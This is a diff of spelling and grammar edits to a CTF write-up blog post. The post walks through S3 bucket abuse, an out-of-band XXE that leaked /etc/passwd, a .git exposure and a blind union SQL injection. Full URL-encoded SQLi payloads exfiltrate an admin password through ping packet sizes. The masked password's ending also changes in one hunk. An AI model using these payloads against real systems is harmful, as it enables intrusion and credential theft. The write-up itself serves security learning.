@@ -5,11 +5,11 @@ draft: false
 ---
 
 
-This write-up is co-written by me [@Dexter0us](https://twitter.com/0xDexter0us) and [@mass0ma](https://twitter.com/mass0ma). We were one of the winners of the CTF and won a $100 reward from [hacker101](https://hacker101.com). The CTF was quiet challenging and fun to play. We hope you can enjoy and gain something from this write-up. You can folow us of Twitter [@Dexter0us](https://twitter.com/0xDexter0us), [@mass0ma](https://twitter.com/mass0ma) and hang out with us on Discord [Hack The Planet](https://discord.gg/pRZDxmxp) [Bounty Hunters](https://discord.gg/bugbounty) if you like :).
+This write-up is co-written by me [@Dexter0us](https://twitter.com/0xDexter0us) and [@mass0ma](https://twitter.com/mass0ma). We were one of the winners of the CTF and won a $100 reward from [hacker101](https://hacker101.com). The CTF was quite challenging and fun to play. We hope you can enjoy and gain something from this write-up. You can follow us of Twitter [@Dexter0us](https://twitter.com/0xDexter0us), [@mass0ma](https://twitter.com/mass0ma) and hang out with us on Discord [Hack The Planet](https://discord.gg/pRZDxmxp) [Bounty Hunters](https://discord.gg/bugbounty) if you like :).
 
 ---
 
-We started the CTF with the basic endpoint enumeration. We found two endpoints `.config` and `zipfiles` which were looked interesting but both turned out to be rabbit holes and nothing was in them. We also looked at Javascript files and registered for an account within the application, but didn't come across anything interesting. That's when a hint popped up on twitter.
+We started the CTF with the basic endpoint enumeration. We found two endpoints `.config` and `zip files` which looked interesting but both turned out to be rabbit holes and nothing was in them. We also looked at Javascript files and registered for an account within the application, but didn't come across anything interesting. That's when a hint popped up on twitter.
 
 {{< image src="/images/ccc-h1ctf/image-20210603221644140.png" position="center" style="border-radius: 5px;" >}}
 
@@ -19,7 +19,7 @@ An endpoint disclosure! We had to guess the extension which was simply `txt`. In
 {{< image src="/images/ccc-h1ctf/image-20210603221849214.png" position="center" style="border-radius: 5px;" >}}
 
 
-Five AWS S3 bucket URLs. Since the CTF was based on [@todayisnew](https://twitter.com/codecancare)’s best vulnerabilities, we knew the two best bug classes to hunt for would be Subdomain Takeover and Information Disclosure. Right away we started to test the permissions of these S3 buckets. Out of five buckets only two gave interesting results. The first, `h1-6hin8w`, returned `NXDOMAIN` and the second, `h1-cn9uhd`, allowed to access a file called `files.xml`.
+Five AWS S3 bucket URLs. Since the CTF was based on [@todayisnew](https://twitter.com/codecancare)’s best vulnerabilities, we knew the two best bug classes to hunt for would be Subdomain Takeover and Information Disclosure. Right away we started to test the permissions of these S3 buckets. Out of five buckets only two gave interesting results. The first, `h1-6hin8w`, returned `NXDOMAIN` and the second, `h1-cn9uhd`, allowed access to a file called `files.xml`.
 
 {{< image src="/images/ccc-h1ctf/image-20210603223741876.png" position="center" style="border-radius: 5px;" >}}
 
@@ -38,7 +38,7 @@ Why not make a fake `files.xml` file and upload it to bucket and have some fun w
 {{< image src="/images/ccc-h1ctf/image-20210603222925432.png" position="center" style="border-radius: 5px;" >}}
 
 
-From the downloaded xml file we discovered a new domain `patopirata.com`. After some digging and directory bruteforcing on that new domain, we discovered a new file `http://patopirata.com/info.php` although this turned out to be another rabbit hole. However, the xml file in itself was a big hint: **XXE**
+From the downloaded xml file we discovered a new domain `patopirata.com`. After some digging and directory brute forcing on that new domain, we discovered a new file `http://patopirata.com/info.php` although this turned out to be another rabbit hole. However, the xml file in itself was a big hint: **XXE**
 
 {{< image src="/images/ccc-h1ctf/image-20210603224127421.png" position="center" style="border-radius: 5px;" >}}
 ---
@@ -62,7 +62,7 @@ After falling into two rabbit holes we started to test the main application, we 
 ```
 
 We saved the above files as `evil.dtd` and `files.xml` respectively in our S3 bucket with public read access.
-After that we reloaded our page and we got hit on our burp collaborator and guess what it contained base64 encoded `etc/passwd` file.
+After that we reloaded our page and we got hit on our burp collaborator and guessed that it contained a base64 encoded `etc/passwd` file.
 
 {{< image src="/images/ccc-h1ctf/image-20210603230030784.png" position="center" style="border-radius: 5px;" >}}
 
@@ -101,18 +101,18 @@ We got so pumped and thought we are just a few steps away from RCE but after str
 $secret_hash='MUI0MjM3RjQ3NjgyNjk4NkRBNjMwMjJBNzZDMzVCQjE=';
 ```
 
-So we started to reverse the hash, it was a base64 encoded md5 hash. After decoding the hash we got the value `dQw4w9WgXcQ` we started to think all over the place where can this hash be used, then after dropping the hash in google we realised.
+So we started to reverse the hash, it was a base64 encoded md5 hash. After decoding the hash we got the value `dQw4w9WgXcQ` we started to think all over the place where this hash could be used, then after dropping the hash in google we realised.
 
 {{< image src="/images/ccc-h1ctf/image-20210603233705690.png" position="center" style="border-radius: 5px;" >}}
 ---
 
 {{< image src="/images/ccc-h1ctf/image-20210603233909342.png" position="center" style="border-radius: 5px;" >}}
 
-*We got Rick Rolled* and we are big believers of *KARMA* then this happened.
+*We got Rick Rolled* and we are big believers of *KARMA* Then this happened.
 
 {{< image src="/images/ccc-h1ctf/image-20210603234954621.png" position="center" style="border-radius: 5px;" >}}
 
-We Rick Rolled the creater of the CTF Adam Langley himself then there was a second hint which dropped earlier.
+We Rick Rolled the creator of the CTF Adam Langley himself then there was a second hint which dropped earlier.
 
 {{< image src="/images/ccc-h1ctf/image-20210603231333989.png" position="center" style="border-radius: 5px;" >}}
 
@@ -213,7 +213,7 @@ http {
 {{< code language="nginx" title="default" id="2" expand="Expand" collapse="Hide" isCollapsed="true" >}}
 pre {
   ##
-# You should look at the following URL's in order to grasp a solid understanding
+# You should look at the following URLs in order to grasp a solid understanding
 # of Nginx configuration files in order to fully unleash the power of Nginx.
 # https://www.nginx.com/resources/wiki/start/
 # https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
@@ -286,7 +286,7 @@ in the `etc/nginx/sites-enabled/default` file under the location we found a new 
 
 {{< image src="/images/ccc-h1ctf/image-20210603232547150.png" position="center" style="border-radius: 5px;" >}}
 
-Here we started doing our basic directory bruteforcing and soon after we found `.git` endpoint, the best thing a pentester can ask for. We downloaded the `.git/config` file and found a open github repository.
+Here we started doing our basic directory brute forcing and soon after we found `.git` endpoint, the best thing a pentester can ask for. We downloaded the `.git/config` file and found an open github repository.
 
 {{< image src="/images/ccc-h1ctf/image-20210603232750970.png" position="center" style="border-radius: 5px;" >}}
 ---
@@ -299,11 +299,12 @@ After that we cloned the repository and started to do the source code analysis. 
 {{< image src="/images/ccc-h1ctf/image-20210604025003604.png" position="center" style="border-radius: 5px;" >}}
 ---
 {{< image src="/images/ccc-h1ctf/image-20210604025015169.png" position="center" style="border-radius: 5px;" >}}
-After further analysis we got a big confirmation that we are on right track, when we saw this unsanitised SQL query and we knew we have to deal with SQLi here.
+
+After further analysis we got a big confirmation that we are on the right track, when we saw this unsanitised SQL query and we knew we have to deal with SQLi here.
 
 {{< image src="/images/ccc-h1ctf/image-20210604015150785.png" position="center" style="border-radius: 5px;" >}}
 
-so we first tried to figure out ways to make connection to our server but for some reasons none of them worked and we were facing a blind SQL injection so were not even greeted with any SQL error in case we messed up our payloads, after alot of googling and write-up reading we came to conclusion that we are facing a Union Based Blind SQL Injection so we have to use payloads in this format as the code in db.sql indicates 
+so we first tried to figure out ways to make connection to our server but for some reasons none of them worked and we were facing a blind SQL injection so were not even greeted with any SQL error in case we messed up our payloads, after a lot of googling and write-up reading we came to conclusion that we are facing a Union Based Blind SQL Injection so we have to use payloads in this format as the code in db.sql indicates 
 
 ```sql
 -1 union select 1,127.0.0.1,32 -- 
@@ -314,7 +315,7 @@ Our full payload should look like this with url encoding:
 https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping/?id=-1%20UNION%20SELECT%204%2c'127.0.0.1'%2c32%20--%20
 ```
 
-On our VPS we started to trace the ping with tcpdump and we got call back.
+On our VPS we started to trace the ping with tcpdump and we got a call back.
 ```bash
 tcpdump ip proto \\icmp
 ```
@@ -330,7 +331,7 @@ After successfully getting callback we needed to figure out the password length 
 ```http
 https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping/?id=-1%20UNION%20SELECT%204,'127.0.0.1',32%20from%20user%20where%20id=1%20and%20length(password)<22%20limit%201--
 ```
-Then we got result length of password, which is 21 characters. So we now use the following payload to exfil the password via packet size character by character upto 21 characters :
+Then we got the result length of the password, which is 21 characters. So we now use the following payload to exfil the password via packet size character by character upto 21 characters :
 
 ```sql
 -1 UNION SELECT 4,'127.0.0.1',ascii(substring(password,1,1)) from user where id=1 -- 
@@ -342,13 +343,13 @@ Then we got result length of password, which is 21 characters. So we now use the
 https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping/?id=-1%20UNION%20SELECT%204,'127.0.0.1',ascii(substring(password,1,1))from%20user%20where%20id=1%20--
 ```
 
-Biggest frustrating part of this CTF was the time limit on the `/api/ping` endpoint, one request per one minute. For hitting the endpoint 21 times we automated this process with burp intruder and we added delay of one minute between each request.
+Biggest frustrating part of this CTF was the time limit on the `/api/ping` endpoint, one request per one minute. For hitting the endpoint 21 times we automated this process with burp intruder and we added a delay of one minute between each request.
 
 {{< image src="/images/ccc-h1ctf/image-20210604022539717.png" position="center" style="border-radius: 5px;" >}}
 ---
 {{< image src="/images/ccc-h1ctf/2021-06-04_11-19.png" position="center" style="border-radius: 5px;" >}}
 
-After 21 requests and 21 minutes of waiting we finally got all characters but in packet length we had to subtract the packet length from `8` to get the ASCII value of the character of our password then we ended up with : `Ud7##############dQgI` 
+After 21 requests and 21 minutes of waiting we finally got all characters but in packet length we had to subtract the packet length from `8` to get the ASCII value of the character of our password then we ended up with : `Ud7##############DLGL` 
 
 {{< image src="/images/ccc-h1ctf/image-20210604023822223.png" position="center" style="border-radius: 5px;" >}}
 
@@ -357,6 +358,4 @@ Using the password along with admin username we logged in to the Pinger Network 
 {{< image src="/images/ccc-h1ctf/2021-06-19_18-57.png" position="center" style="border-radius: 5px;" >}}
 
 
-I would like to mention our mentor [@pmnh](https://twitter.com/h1pmnh) who helped us alot and our dear friend [Kabir Suda (MR-SINISTER)](https://twitter.com/KabirSuda) for playing along.
-
-
+I would like to mention our mentor [@pmnh](https://twitter.com/h1pmnh) who helped us a lot and our dear friend [Kabir Suda (MR-SINISTER)](https://twitter.com/KabirSuda) for playing along.
